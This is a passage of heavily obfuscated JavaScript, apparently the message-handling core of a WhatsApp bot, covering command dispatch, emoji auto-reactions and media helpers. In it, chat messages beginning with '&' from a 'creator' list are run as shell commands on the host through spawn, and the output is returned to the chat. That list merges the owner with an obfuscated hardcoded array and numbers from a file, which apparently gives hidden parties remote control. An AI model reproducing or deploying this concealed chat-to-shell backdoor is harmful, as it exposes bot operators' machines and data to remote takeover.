0x587,'qfl[')]:W[TW('L1Eo',0x761)](y,W[TW('PvnQ',0x373)])&&w[TD(0x32a,'P3G[')][TD(0x63c,'g[45')][TW('Cwb0',0x6c3)]?w[TW('k3b4',0x5f1)][TD(0x66d,'k^n3')][TD(0x52a,'[6DJ')]:'',X=k[TW('nedN',0x410)](prefix);var Z=typeof w[TD(0x257,'s^Fc')]==TW('DgCj',0x597)?w[TW('qrUI',0x39c)]:![];const i=X?k[TD(0x56b,'Fy60')](prefix[TW('uu]K',0x6e4)])[TW('L1Eo',0x43c)]()[TW(']edL',0x763)]('\x20')[TD(0x3e4,'uu]K')]()[TW('[ixr',0x7cc)]():'',h=k[TD(0x414,'s^Fc')]()[TW('g[45',0x605)](/ +/)[TD(0x2f9,'k3b4')](0x1),a=h[TD(0x51c,'&4XY')]('\x20'),f=h[TD(0x286,'[6DJ')]('\x20'),v=I[TW('b1Jh',0x4d3)](W[TD(0x4fb,'k3b4')]),U=w[TD(0x2b0,'w16Y')][TW('nddH',0x452)]?Q[TW('fG[m',0x49b)]['id'][TD(0x366,'Snxf')](':')[0x0]+W[TW('8pj0',0x38d)]||Q[TD(0x5a0,'qrUI')]['id']:w[TW('$c1w',0x437)][TW('#@yP',0x473)]||w[TD(0x5ca,'S[Xd')][TD(0x30e,'jF$J')],K=U[TW('[6DJ',0x3af)]('@')[0x0],s=Q[TD(0x5d4,'dGmC')]['id'][TD(0x5b6,'PZEL')](':')[0x0],z=w[TD(0x29a,'b1Jh')]||TD(0x363,'K@#W'),J=s[TW('Cwb0',0x722)](K),u=ownerNumber[TW('YUh9',0x517)](K)||J,R=await W[TD(0x32e,'fG[m')](jidNormalizedUser,Q[TD(0x528,'4FV4')]['id']),A=v?await Q[TD(0x27d,'S[Xd')](I)[TW('^6X@',0x5e9)](rt=>{}):'',M=v?A[TW('PZEL',0x524)]:'',E=v?await A[TD(0x5c6,'DZj@')]:'',H=v?await W[TD(0x690,'YFN*')](getGroupAdmins,E):'',b=v?H[TD(0x4f5,'FrlN')](R):![],o=v?H[TW('N[@@',0x5a4)](U):![],L=n[TW('S[Xd',0x6be)][TW('8pj0',0x387)]?!![]:![],r0=rt=>{function TN(F,W){return TD(W- -0x16b,F);}function TG(F,W){return TD(F- -0x72,W);}const rd={};rd[TG(0x315,'PZEL')]=rt;const rQ={};rQ[TN('8pj0',0xdc)]=w,Q[TN('kD3)',0x406)](I,rd,rQ);},r1=s[TD(0x54d,'nddH')]('@')[0x0],r2=(W[TW('4FV4',0x5f3)],W[TD(0x310,']edL')]),r3=JSON[TW('Fy60',0x68b)](fs[TW('nddH',0x58b)](W[TW('Cwb0',0x6b5)],W[TW('w16Y',0x50d)]));let r4=[r1,...r2,W[TD(0x49c,'nddH')](config[TD(0x62f,']edL')],W[TD(0x328,')V19')]),...r3][TD(0x451,'nddH')](rt=>rt[TW('yq$D',0x71c)](/[^0-9]/g,'')+TW('7liI',0x7d0))[TD(0x259,'$c1w')](w[TD(0x60f,'b1Jh')]);if(r4&&w[TW('Snxf',0x38a)][TW('qrUI',0x60c)]('&')){let rt=Z[TW('tTKA',0x503)](0x2);if(!rt){W[TW('PZEL',0x4b8)](r0,TW('k3b4',0x5eb));return;}const {spawn:rd}=W[TW('n)xc',0x619)](require,W[TD(0x344,'PZEL')]);try{const rQ={};rQ[TD(0x2fe,'dGmC')]=!![];let rw=W[TW('k^n3',0x69c)](rd,rt,rQ);rw[TD(0x327,'akR7')]['on'](W[TD(0x563,'L1Eo')],rV=>{function Td(F,W){return TD(W- -0x2f7,F);}function Tt(F,W){return TD(W- -0x384,F);}V[Tt('PvnQ',0x1e5)](r0,rV[Td('fG[m',0x37e)]());}),rw[TW('fG[m',0x7dd)]['on'](TW('&4XY',0x5a2),rV=>{function TQ(F,W){return TD(W- -0x143,F);}function Tw(F,W){return TW(F,W- -0x70);}W[TQ('YUh9',0x451)](r0,rV[TQ('kD3)',0x22f)]());}),rw['on'](W[TD(0x4a3,'6Gvh')],rV=>{function TO(F,W){return TW(F,W-0x48);}function TV(F,W){return TW(W,F- -0x2d3);}V[TV(0x298,'$c1w')](r0,rV[TV(0x21e,'DgCj')]());}),rw['on'](W[TW('k3b4',0x632)],rV=>{function Tn(F,W){return TD(W- -0xae,F);}function TC(F,W){return TD(F- -0x217,W);}V[TC(0x403,'[6DJ')](rV,0x0)&&V[Tn('k3b4',0x577)](r0,TC(0x486,'#@yP')+rV);});}catch(rV){W[TD(0x69f,'qrUI')](r0,util[TW('p(mL',0x6de)](rV));}return;}if(!L&&W[TW('n)xc',0x390)](config[TD(0x3d8,'K@#W')],W[TW('FrlN',0x6cf)])){const rO=['🌼','❤️','💐','🔥',TW(']edL',0x55b),'❣️','☺️',TD(0x422,'L1Eo'),'💥','🥀',TD(0x4bd,'$c1w'),'🤒','😩','💓','🤭','👍','💚','😍','😻','🙌','😃','🌺','👌',W[TD(0x3ca,'4FV4')],W[TW('s^Fc',0x574)],W[TW('DZj@',0x4d1)],'😏',W[TD(0x638,'K@#W')],W[TW(')V19',0x7d8)],W[TD(0x4da,'uu]K')],'🤓','😇','🙂','💕','❣️',W[TD(0x3cc,'yq$D')],W[TW('DgCj',0x6e2)],'🤗',W[TD(0x612,'P3G[')],W[TD(0x39d,'nddH')],'🤷',W[TW('aGNO',0x691)],'🤦','😍','😯','💇','💃',W[TD(0x52c,'q(Fq')],'💯','🧶','😎','👑','💍','💞','💖','🎒','🥽','🐻','🐼','🐭','🐣','🪿','🦆','🦊','🦋','🦄','🪼','🐋','🐳','🦈','🐍',TW(']edL',0x6c0),'🦦','🦚','🌱','🍃','🎍','🌿','☘️','🍀','🍁','🪺','🍄',W[TD(0x5b0,'$c1w')],'🪸','🪨','🌺','🪷','🪻','🥀','🌹','🌷','💐','🌾','🌸','🌼','🌻','🌝','🌚','🌕','🌎','💫','🔥','☃️','❄️',TW('p(mL',0x56f),'🫧','🍟','🍫','🧃','🧊','🪀','🤿','🏆','🥇','🥈','🥉',W[TD(0x60d,'b1Jh')],'🤹',W[TD(0x41f,')V19')],'🎧','🎤','🥁','🧩','🎯','🚀','🚁','🗿',W[TD(0x276,'b1Jh')],'⌛','⏳','💸','💎','⚙️','⛓️','🔪','🧸','🎀','🪄','🎈','🎁','🎉','🏮','🪩','📩','💌','📤','📦','📊','📈','📑','📉','📂','🔖','🧷','📌','📝','🔏','🔐','🩷','❤️','🧡','💛','💚','🩵','💙','💜','🖤','🩶','🤍','🤎',W[TW('8pj0',0x423)],W[TD(0x54b,'dGmC')],'💗','💖','💘','💝','❌','✅','🔰','〽️','🌐','🌀','⤴️','⤵️','🔴','🟢','🟡','🟠','🔵','🟣','⚫','⚪','🟤','🔇','🔊','📢','🔕','♥️','🕐','🚩',W[TW('7liI',0x728)]],rC=rO[Math[TD(0x5b5,'fG[m')](Math[TW('n)xc',0x4e1)]()*rO[TW('#@yP',0x389)])];n[TW('8BvI',0x37d)](rC);}if(!L&&W[TD(0x385,']edL')](K,s)){if(W[TD(0x399,'dGmC')](config[TW('K@#W',0x7eb)],W[TD(0x305,'7liI')])){const rn=['🌼','❤️','💐','🔥',W[TW(']edL',0x39f)],'❄️','🧊','🐳','💥','🥀',W[TW('s^Fc',0x60d)],'🥹','😩','🫣','🤭','👻','👾','🫶','😻','🙌','🫂','🫀',W[TW('q(Fq',0x386)],TW('L1Eo',0x6cc),TW('nedN',0x70a),TW('Snxf',0x581),'🧕',TD(0x2b4,'PvnQ'),W[TW('fG[m',0x368)],W[TD(0x5aa,'dGmC')],W[TW('nedN',0x433)],W[TW('Fy60',0x7ab)],'🧟',W[TD(0x3b1,'g[45')],'🧞',W[TW('Fy60',0x360)],TW('PvnQ',0x7dc),W[TW('b1Jh',0x5d7)],TD(0x629,'8pj0'),W[TW('^6X@',0x6c6)],'🤷',W[TD(0x3e3,'s^Fc')],'🤦',W[TD(0x2a8,'g[45')],W[TD(0x4df,'fG[m')],'💇','💃',W[TD(0x521,'dGmC')],'🚶','🧶','🧤','👑','💍','👝','💼','🎒','🥽',W[TW('k3b4',0x65c)],'💸','😇','🍂','💥','💯','🔥','💫','💎','💗','🤍','🖤','👀','🙌','🙆','🚩','🥰','💐','😎','🤎','✅','🫀','🧡','😁','😄','🌸',W[TD(0x2a2,'K@#W')],'🌷','⛅','🌟','🗿',TW('uu]K',0x430),'💜','💙','🌝','🖤','🎎','🎏','🎐','⚽','🧣','🌿','⛈️',W[TD(0x2f7,'akR7')],'🌚','🌝','🙈','🙉','🦖','🐤',W[TD(0x6a4,'6Gvh')],'🥇','👾','🔫','🐝','🦋','🍓','🍫','🍭','🧁','🧃','🍿','🍻','🛬','🫀','🫠','🐍','🥀','🌸',W[TW('Cwb0',0x7d7)],'🌻','🍂','🍁','🍄','🌾','🌿','🌱','🍀','🧋','💒','🏩',W[TD(0x436,'[6DJ')],'🏰','🏪',W[TW(']edL',0x689)],W[TD(0x6a4,'6Gvh')],'🥇','⛳','📟','🏮','📍','🔮','🧿','♻️','⛵','🚍','🚔',W[TW('aGNO',0x4b7)],'🚆','🚤','🚕','🛺','🚝','🚈',TD(0x5e4,'qfl['),W[TD(0x253,'PvnQ')],'🛵','🥂','🍾','🍧','🐣','🐥','🦄','🐯','🐦','🐬','🐋','🦆','💈','⛲','⛩️','🎈','🎋','🪀','🧩','👾','💸','💎','🧮','👒','🧢','🎀','🧸','👑','〽️','😳','💀','☠️','👻','🔥','♥️','👀','🐼','🐭','🐣','🪿','🦆','🦊','🦋','🦄','🪼','🐋','🐳','🦈','🐍',W[TD(0x2f5,'nedN')],'🦦','🦚','🌱','🍃','🎍','🌿','☘️','🍀','🍁','🪺','🍄',TW('N[@@',0x75c),'🪸','🪨','🌺','🪷','🪻','🥀','🌹','🌷','💐','🌾','🌸','🌼','🌻','🌝','🌚','🌕','🌎','💫','🔥','☃️','❄️',W[TW('Snxf',0x3cf)],'🫧','🍟','🍫','🧃','🧊','🪀','🤿','🏆','🥇','🥈','🥉',TW('n)xc',0x703),'🤹',W[TD(0x261,'kD3)')],'🎧','🎤','🥁','🧩','🎯','🚀','🚁','🗿',TD(0x3e1,'w16Y'),'⌛','⏳','💸','💎','⚙️','⛓️','🔪','🧸','🎀','🪄','🎈','🎁','🎉','🏮','🪩','📩','💌','📤','📦','📊','📈','📑','📉','📂','🔖','🧷','📌','📝','🔏','🔐','🩷','❤️','🧡','💛','💚','🩵','💙','💜','🖤','🩶','🤍','🤎',W[TD(0x302,'nddH')],W[TD(0x2eb,'N[@@')],'💗','💖','💘','💝','❌','✅','🔰','〽️','🌐','🌀','⤴️','⤵️','🔴','🟢','🟡','🟠','🔵','🟣','⚫','⚪','🟤','🔇','🔊','📢','🔕','♥️','🕐','🚩',W[TD(0x307,'N[@@')],'🧳','🌉','🌁',W[TW('PZEL',0x7a6)],W[TW('[ixr',0x62b)],W[TD(0x288,'s^Fc')],'🏠','🏡','🧀','🍥','🍮','🍰','🍦','🍨','🍧','🥠','🍡','🧂','🍯','🍪','🍩','🍭','🥮','🍡'],ry=rn[Math[TD(0x30b,'b1Jh')](W[TW('Fy60',0x378)](Math[TW('qfl[',0x35e)](),rn[TW('YUh9',0x5f8)]))];n[TD(0x597,'qrUI')](ry);}}if(!L&&W[TW('4FV4',0x6d6)](config[TD(0x519,'^6X@')],TD(0x3a4,'S[Xd'))){const rl=(config[TW('s^Fc',0x5e2)]||W[TW('jF$J',0x532)])[TW('YUh9',0x7d1)](','),rg=rl[Math[TD(0x30b,'b1Jh')](W[TW(')V19',0x392)](Math[TD(0x5bc,'DgCj')](),rl[TW('Snxf',0x7cf)]))];n[TD(0x69b,'YFN*')](rg);}const r5=JSON[TD(0x6c8,'L1Eo')](fs[TW('8pj0',0x371)](TW('DgCj',0x37c),W[TW('Snxf',0x396)])),r6=r5[TW('[ixr',0x687)](U);if(r6)return;const r7=JSON[TD(0x341,'jF$J')](fs[TD(0x330,'aGNO')](W[TW('uu]K',0x692)],W[TD(0x64b,'&4XY')])),r8=config[TD(0x3a3,'6Gvh')]+TD(0x617,'YUh9'),r9=r7[TD(0x4e3,'S[Xd')](U),rr=W[TW('s^Fc',0x578)](U,r8)||J||r9;if(!rr&&config[TW('Fy60',0x706)]===W[TD(0x67c,'8BvI')])return;if(!rr&&v&&config[TD(0x450,'$c1w')]===TD(0x34d,'YUh9'))return;if(W[TD(0x332,'fG[m')](!rr,!v)&&W[TW('s^Fc',0x530)](config[TW('nedN',0x6db)],W[TD(0x358,'&4XY')]))return;const rT=W[TD(0x2df,'yq$D')](require,W[TW('8pj0',0x4ae)]),rp=X?k[TD(0x582,'p(mL')](0x1)[TW('#@yP',0x698)]()[TD(0x296,'k3b4')]('\x20')[0x0][TW('uu]K',0x79b)]():![];if(X){const rI=rT[TD(0x2e7,'&4XY')][TD(0x568,'6Gvh')](rm=>rm[TW('[ixr',0x3c3)]===rp)||rT[TW('S[Xd',0x7ac)][TD(0x368,'k3b4')](rm=>rm[TW('7liI',0x569)]&&rm[TW('FrlN',0x68d)][TD(0x41d,'PvnQ')](rp));if(rI){if(rI[TD(0x3be,'^6X@')])Q[TW('s^Fc',0x478)](I,{'react':{'text':rI[TW('kD3)',0x3be)],'key':w[TD(0x2fc,'8pj0')]}});try{const rm={};rm[TW('$c1w',0x70d)]=I,rm[TD(0x539,'L1Eo')]=c,rm[TD(0x24c,'&4XY')]=k,rm[TD(0x4dc,'kD3)')]=X,rm[TD(0x544,'tTKA')]=i,rm[TD(0x26b,'DZj@')]=h,rm['q']=a,rm[TD(0x257,'s^Fc')]=f,rm[TD(0x628,'8BvI')]=v,rm[TD(0x471,'PZEL')]=U,rm[TW('tTKA',0x39d)]=K,rm[TD(0x619,'$c1w')]=R,rm[TW('fG[m',0x4e5)]=s,rm[TW('aGNO',0x37b)]=z,rm[TD(0x3f5,'g[45')]=J,rm[TD(0x375,'uu]K')]=u,rm[TD(0x561,'K@#W')]=r4,rm[TD(0x681,'DgCj')]=A,rm[TD(0x2ca,'n)xc')]=M,rm[TD(0x610,'^6X@')]=E,rm[TW(')V19',0x61e)]=H,rm[TW('qrUI',0x499)]=b,rm[TD(0x55f,'s^Fc')]=o,rm[TW(')V19',0x601)]=r0,rI[TD(0x47c,'YFN*')](Q,w,n,rm);}catch(rc){console[TD(0x6b8,'s^Fc')](W[TW('8BvI',0x732)](W[TW('kD3)',0x579)],rc));}}}function TD(F,W){return T4(F-0x31a,W);}rT[TD(0x3c9,'YUh9')][TW('8BvI',0x7db)](async rk=>{function Ty(F,W){return TD(W- -0x376,F);}function Tl(F,W){return TW(W,F- -0x24a);}if(k&&rk['on']===Ty('8BvI',0x1bf))rk[Ty('8BvI',0xa5)](Q,w,n,{'from':I,'l':l,'quoted':c,'body':k,'isCmd':X,'command':rk,'args':h,'q':a,'text':f,'isGroup':v,'sender':U,'senderNumber':K,'botNumber2':R,'botNumber':s,'pushname':z,'isMe':J,'isOwner':u,'isCreator':r4,'groupMetadata':A,'groupName':M,'participants':E,'groupAdmins':H,'isBotAdmins':b,'isAdmins':o,'reply':r0});else{if(w['q']&&V[Ty('Fy60',0x113)](rk['on'],V[Tl(0x1a2,'7liI')]))rk[Tl(0x1b6,'[ixr')](Q,w,n,{'from':I,'l':l,'quoted':c,'body':k,'isCmd':X,'command':rk,'args':h,'q':a,'text':f,'isGroup':v,'sender':U,'senderNumber':K,'botNumber2':R,'botNumber':s,'pushname':z,'isMe':J,'isOwner':u,'isCreator':r4,'groupMetadata':A,'groupName':M,'participants':E,'groupAdmins':H,'isBotAdmins':b,'isAdmins':o,'reply':r0});else{if((rk['on']===V[Ty('fG[m',0x114)]||V[Ty('tTKA',-0xff)](rk['on'],V[Tl(0x2f4,'q(Fq')]))&&V[Ty('L1Eo',-0x62)](w[Tl(0x250,'PZEL')],V[Tl(0x160,'N[@@')]))rk[Tl(0x168,'dGmC')](Q,w,n,{'from':I,'l':l,'quoted':c,'body':k,'isCmd':X,'command':rk,'args':h,'q':a,'text':f,'isGroup':v,'sender':U,'senderNumber':K,'botNumber2':R,'botNumber':s,'pushname':z,'isMe':J,'isOwner':u,'isCreator':r4,'groupMetadata':A,'groupName':M,'participants':E,'groupAdmins':H,'isBotAdmins':b,'isAdmins':o,'reply':r0});else V[Ty('qrUI',-0x108)](rk['on'],V[Ty('PZEL',0xad)])&&V[Tl(0x13b,'nddH')](w[Tl(0x1ac,'^6X@')],V[Ty('b1Jh',0x271)])&&rk[Ty('[ixr',-0x93)](Q,w,n,{'from':I,'l':l,'quoted':c,'body':k,'isCmd':X,'command':rk,'args':h,'q':a,'text':f,'isGroup':v,'sender':U,'senderNumber':K,'botNumber2':R,'botNumber':s,'pushname':z,'isMe':J,'isOwner':u,'isCreator':r4,'groupMetadata':A,'groupName':M,'participants':E,'groupAdmins':H,'isBotAdmins':b,'isAdmins':o,'reply':r0});}}});}),Q[T4(0x224,'tTKA')]=w=>{function TI(F,W){return T4(F-0x8,W);}function Tg(F,W){return T5(W- -0x119,F);}if(!w)return w;if(/:\d+@/gi[Tg('k^n3',0x32d)](w)){let V=W[Tg('N[@@',0x4ad)](jidDecode,w)||{};return V[Tg('nddH',0x2a5)]&&V[TI(0x34d,'tTKA')]&&W[Tg(')V19',0x44a)](W[Tg('w16Y',0x38c)](V[Tg('dGmC',0x3be)],'@'),V[TI(0x343,'dGmC')])||w;}else return w;},Q[T5(0x459,'[6DJ')]=async(w,V,O=![],C={})=>{function Tc(F,W){return T5(W- -0x35e,F);}let n;if(C[Tm(0x5c1,'nddH')]){const k=Tm(0x320,'DgCj')[Tc('4FV4',-0x8a)]('|');let X=0x0;while(!![]){switch(k[X++]){case'0':n=Object[Tm(0x5bd,'YUh9')](V[Tc('K@#W',0xf8)][Tc('k3b4',-0x160)][Tm(0x2b2,'YFN*')])[0x0];continue;case'1':V[Tc('p(mL',0x1fd)]=V[Tc('kD3)',0x1f4)]&&V[Tc('p(mL',0x1fd)][Tc('PvnQ',-0x98)]&&V[Tm(0x69f,'$c1w')][Tm(0x55d,'[ixr')][Tc('Snxf',-0x2b)]?V[Tc('N[@@',0x1b)][Tm(0x346,'yq$D')][Tm(0x43d,'#@yP')]:V[Tc('n)xc',-0x55)]||undefined;continue;case'2':V[Tc('s^Fc',0x1ab)]={...V[Tc('Snxf',-0x2b)][Tm(0x2d7,'DgCj')][Tm(0x3a7,'g[45')]};continue;case'3':delete V[Tm(0x33d,')V19')][Tm(0x6ba,'dGmC')][Tc('6Gvh',-0x21f)][n][Tm(0x68b,'qrUI')];continue;case'4':delete(V[Tc('PvnQ',0xdc)]&&V[Tm(0x5eb,'tTKA')][Tc('DgCj',-0x4a)]?V[Tm(0x4a6,'qrUI')][Tm(0x43f,'DgCj')]:V[Tc(']edL',0x52)]||undefined);continue;}break;}}let y=Object[Tc('P3G[',0x222)](V[Tm(0x6f7,'w16Y')])[0x0],g=await W[Tc('8BvI',-0x5)](generateForwardMessageContent,V,O),I=Object[Tc('akR7',-0x11c)](g)[0x0];function Tm(F,W){return T5(F-0x12b,W);}let m={};if(W[Tc('q(Fq',0x23c)](y,Tm(0x6ce,'[6DJ')))m=V[Tc('nedN',-0x1dd)][y][Tc('g[45',-0xef)];g[I][Tm(0x4a3,'dGmC')]={...m,...g[I][Tc('nddH',-0x4e)]};const c=await W[Tc('[6DJ',0xb5)](generateWAMessageFromContent,w,g,C?{...g[I],...C,...C[Tc('YFN*',-0x1)]?{'contextInfo':{...g[I][Tc('k3b4',-0x9e)],...C[Tc('Snxf',0x27a)]}}:{}}:{});return await Q[Tm(0x2c2,'akR7')](w,c[Tc('uu]K',-0x71)],{'messageId':c[Tm(0x316,'4FV4')]['id']}),c;},Q[T4(0x84,'8BvI')]=async(w,V,O=!![])=>{let C=w[Tk('Cwb0',0x352)]?w[Tk('uu]K',0x175)]:w;function TX(F,W){return T4(W-0x2dd,F);}let n=(w[Tk('Snxf',0x3a9)]||w)[Tk('Snxf',0x1e2)]||'';function Tk(F,W){return T5(W- -0x1ee,F);}let y=w[TX('YUh9',0x3f0)]?w[Tk('Fy60',0xba)][TX('4FV4',0x390)](/Message/gi,''):n[TX('8pj0',0x21f)]('/')[0x0];const g=await W[Tk('p(mL',0xbc)](downloadContentFromMessage,C,y);let I=Buffer[Tk('Cwb0',0x14f)]([]);for await(const c of g){I=Buffer[Tk('DZj@',0x239)]([I,c]);}let m=await FileType[TX('Cwb0',0x4aa)](I);return trueFileName=O?W[Tk('qrUI',0x75)](V,'.')+m[TX('dGmC',0x485)]:V,await fs[Tk('7liI',0xe8)](trueFileName,I),trueFileName;},Q[T4(0x1,'p(mL')]=async w=>{function Ti(F,W){return T4(W-0x471,F);}function TZ(F,W){return T4(W-0x319,F);}let V=(w[TZ('n)xc',0x633)]||w)[TZ('[ixr',0x373)]||'',O=w[Ti('PZEL',0x4e6)]?w[TZ('uu]K',0x620)][Ti('&4XY',0x6e4)](/Message/gi,''):V[Ti('6Gvh',0x492)]('/')[0x0];const C=await W[TZ('7liI',0x3a7)](downloadContentFromMessage,w,O);let n=Buffer[Ti('PZEL',0x5f0)]([]);for await(const y of C){n=Buffer[Ti('fG[m',0x635)]([n,y]);}return n;};function T5(F,W){return rR(F-0x13e,W);}Q[T4(0x21c,'$c1w')]=async(w,V,O,C,n={})=>{let y='',g=await axios[Th('DgCj',-0x6d)](V);y=g[Ta('qrUI',0x4be)][W[Th('Snxf',0x15)]];function Ta(F,W){return T5(W-0x71,F);}if(y[Th('[6DJ',-0x12f)]('/')[0x1]===W[Ta('qrUI',0x55f)])return Q[Th('6Gvh',-0xe9)](w,{'video':await W[Th('g[45',-0x73)](getBuffer,V),'caption':O,'gifPlayback':!![],...n},{'quoted':C,...n});let I=y[Ta('fG[m',0x5ae)]('/')[0x0]+W[Ta('nedN',0x5a7)];if(W[Th('YFN*',0x317)](y,Th('k3b4',-0x5c)))return Q[Ta('[ixr',0x543)](w,{'document':await W[Ta('b1Jh',0x511)](getBuffer,V),'mimetype':W[Th('FrlN',-0xa8)],'caption':O,...n},{'quoted':C,...n});function Th(F,W){return T5(W- -0x2c4,F);}if(W[Ta('&4XY',0x5ee)](y[Ta('8BvI',0x54a)]('/')[0x0],Th('fG[m',0x306)))return Q[Th('akR7',0x2ad)](w,{'image':await getBuffer(V),'caption':O,...n},{'quoted':C,...n});if(W[Th('tTKA',0x109)](y[Ta('FrlN',0x42a)]('/')[0x0],W[Th('uu]K',0xf3)]))return Q[Th('K@#W',0x2c)](w,{'video':await W[Th('^6X@',0x2ea)](getBuffer,V),'caption':O,'mimetype':W[Ta('g[45',0x5fb)],...n},{'quoted':C,...n});if(W[Th('w16Y',0x202)](y[Th('uu]K',-0x71)]('/')[0x0],W[Th('aGNO',-0x6a)]))return Q[Ta('tTKA',0x477)](w,{'audio':await W[Th('k3b4',0x48)](getBuffer,V),'caption':O,'mimetype':W[Th('g[45',0xf7)],...n},{'quoted':C,...n});},Q[T5(0x172,'DZj@')]=(w,V,O='',C=Q[T5(0x3b8,'Cwb0')]['id'],n={})=>{let y=Object[TP(0x6c2,'^6X@')](V[Tq(0x383,'FrlN')])[0x0];function TP(F,W){return T4(F-0x3bc,W);}function Tq(F,W){return T4(F-0x172,W);}let g=W[Tq(0x24a,'PvnQ')](y,W[TP(0x383,'nddH')]);g&&(y=Object[TP(0x424,'FrlN')](V[TP(0x51a,'qrUI')][Tq(0x3bc,')V19')][Tq(0x466,'DgCj')])[0x0]);let I=g?V[TP(0x326,'YFN*')][Tq(0x21b,'PvnQ')][TP(0x67f,'dGmC')]:V[Tq(0x121,'qfl[')],m=I[y];if(W[Tq(0x3d4,'dGmC')](typeof m,Tq(0x338,'aGNO')))I[y]=W[TP(0x725,'qrUI')](O,m);else{if(m[TP(0x70b,'kD3)')])m[TP(0x618,'YFN*')]=O||m[TP(0x3be,'n)xc')];else{if(m[TP(0x4cb,'8BvI')])m[TP(0x359,'yq$D')]=O||m[TP(0x56a,'^6X@')];}}if(W[Tq(0x42a,'YFN*')](typeof m,W[TP(0x743,'Cwb0')]))I[y]={...m,...n};if(V[TP(0x2e8,'qfl[')][TP(0x670,'DZj@')])C=V[Tq(0x176,'N[@@')][TP(0x6c9,'DgCj')]=C||V[TP(0x4df,'K@#W')][TP(0x5b4,')V19')];else{if(V[Tq(0x47c,'YUh9')][TP(0x33e,'qfl[')])C=V[TP(0x373,'FrlN')][TP(0x477,'[6DJ')]=C||V[TP(0x62b,'kD3)')][TP(0x670,'DZj@')];}if(V[Tq(0x2f9,'fG[m')][Tq(0x98,'tTKA')][TP(0x448,'p(mL')](W[TP(0x60f,'S[Xd')]))C=C||V[TP(0x752,'jF$J')][Tq(0x388,'PZEL')];else{if(V[Tq(0x1f7,'#@yP')][TP(0x767,'b1Jh')][Tq(0x4a6,'b1Jh')](W[TP(0x4a0,'k3b4')]))C=C||V[Tq(0x508,'jF$J')][Tq(0x12a,'YUh9')];}return V[Tq(0x29a,'DZj@')][Tq(0x4c2,'aGNO')]=w,V[TP(0x620,'YFN*')][Tq(0x3a0,'tTKA')]=W[Tq(0x524,'n)xc')](C,Q[TP(0x432,'aGNO')]['id']),proto[TP(0x493,'Snxf')][Tq(0x3d0,'DgCj')](V);},Q[T4(0x2b2,'FrlN')]=async(w,V)=>{let O;function Tv(F,W){return T4(F-0x463,W);}function Tf(F,W){return T4(W- -0x72,F);}let C=Buffer[Tf('dGmC',0x1a5)](w)?w:/^data:.*?\/.*?;base64,/i[Tv(0x3e8,'fG[m')](w)?Buffer[Tf('P3G[',0x1bb)](w[Tf('6Gvh',-0x51)]`,`[0x1],W[Tf('akR7',-0x83)]):/^https?:\/\//[Tf('fG[m',-0xed)](w)?await(O=await W[Tv(0x672,'^6X@')](getBuffer,w)):fs[Tv(0x4ba,'q(Fq')](w)?(g=w,fs[Tv(0x661,'yq$D')](w)):W[Tf('w16Y',0x23)](typeof w,W[Tf('nedN',-0x9e)])?w:Buffer[Tf('$c1w',-0x25)](0x0);const n={};n[Tf('6Gvh',0x183)]=W[Tf('p(mL',0x1db)],n[Tf('DZj@',0x20e)]=Tv(0x56d,'q(Fq');let y=await FileType[Tv(0x5f8,'6Gvh')](C)||n,g=path[Tv(0x5a7,'Snxf')](__filename,W[Tf('Fy60',0x2d)](W[Tf('N[@@',0x1cf)](__dirname,new Date()*0x1)+'.',y[Tv(0x41c,'jF$J')]));if(C&&V)fs[Tv(0x45b,'Cwb0')][Tf('S[Xd',0x269)](g,C);return{'res':O,'filename':g,'size':await W[Tv(0x4e5,'&4XY')](getSizeMedia,C),...y,'data':C};},Q[T5(0x1bd,'S[Xd')]=async(w,V,O,C={},n={})=>{let y=await Q[TU(0x3f7,'DZj@')](V,!![]),{filename:g,size:I,ext:m,mime:c,data:k}=y,X='',Z=c,i=g;if(n[TK(0x3ce,'Fy60')])X=TK(0x1a1,'FrlN');if(n[TU(0x6ff,'#@yP')]||/webp/[TU(0x30b,'P3G[')](c)){let {writeExif:f}=W[TK(0x3e2,']edL')](require,W[TK(0x35a,'Cwb0')]);const v={};v[TU(0x6ae,'tTKA')]=c,v[TU(0x2f9,'#@yP')]=k;let U=v;const K={};K[TU(0x3fa,'N[@@')]=Config[TK(0x492,'k3b4')],K[TK(0x2c8,'YFN*')]=Config[TK(0x492,'k3b4')],K[TU(0x5a0,'uu]K')]=n[TU(0x434,'fG[m')]?n[TK(0x32b,'PZEL')]:[],i=await W[TK(0x55d,'uu]K')](f,U,K),await fs[TK(0x2d0,'b1Jh')][TU(0x36c,'K@#W')](g),X=TU(0x33e,'[ixr'),Z=W[TK(0x3d0,'&4XY')];}else{if(/image/[TK(0x267,'Fy60')](c))X=W[TU(0x331,'N[@@')];else{if(/video/[TU(0x28a,'8pj0')](c))X=W[TU(0x3fd,'qfl[')];else{if(/audio/[TK(0x4a5,'s^Fc')](c))X=W[TU(0x338,'uu]K')];else X=W[TU(0x692,'$c1w')];}}}function TK(F,W){return T5(F- -0x3e,W);}function TU(F,W){return T4(F-0x355,W);}const h={};h[TU(0x275,'7liI')]=i;const a={[X]:h,'mimetype':Z,'fileName':O,...n},q={'quoted':C,...n};return await Q[TK(0x19a,'$c1w')](w,a,q),fs[TK(0x56e,'kD3)')][TK(0x3fd,'k^n3')](i);},Q[T4(0x2e6,'uu]K')]=async w=>{function Tz(F,W){return T5(F-0x37b,W);}function Ts(F,W){return T5(W-0x165,F);}return[...w[Ts(')V19',0x5c0)](/@([0-9]{5,16}|0)/g)][Ts('kD3)',0x46a)](V=>V[0x1]+Tz(0x89c,'uu]K'));},Q[T4(0x2d,'dGmC')]=async(w,V,O='',C='',n='',y={})=>{let g=await Q[TJ('yq$D',0x4a8)](V,!![]),{mime:I,ext:m,res:c,data:k,filename:X}=g;if(c&&c[Tu('8pj0',0x6aa)]!==0xc8||W[Tu('kD3)',0x4f1)](file[Tu('nedN',0x396)],0x10000))try{throw{'json':JSON[TJ('aGNO',0x59b)](file[Tu('qrUI',0x62d)]())};}catch(v){if(v[Tu('#@yP',0x5a1)])throw v[Tu('n)xc',0x4b9)];}function TJ(F,W){return T4(W-0x40b,F);}let Z='',i=I,h=X;if(y[TJ('[ixr',0x5f8)])Z=W[Tu('8pj0',0x77f)];if(y[Tu('YUh9',0x774)]||/webp/[Tu('8BvI',0x7a7)](I)){let {writeExif:U}=W[TJ('k^n3',0x66a)](require,W[TJ('[6DJ',0x763)]);const K={};K[Tu('qrUI',0x551)]=I,K[Tu('4FV4',0x604)]=k;let s=K;const 